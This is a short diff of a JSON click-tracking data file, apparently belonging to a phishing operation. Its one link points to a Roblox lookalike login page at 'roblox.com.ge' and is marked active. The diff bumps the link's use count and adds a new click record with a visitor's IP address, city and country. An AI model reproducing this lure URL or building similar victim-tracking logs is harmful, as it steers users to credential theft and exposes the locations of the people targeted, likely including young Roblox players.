@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1129,
+    "useCount": 1130,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9176,6 +9176,14 @@
         "city": "Ilagan City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777276442785,
+        "ip": "159.26.99.226",
+        "country": "United States",
+        "city": "Los Angeles",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
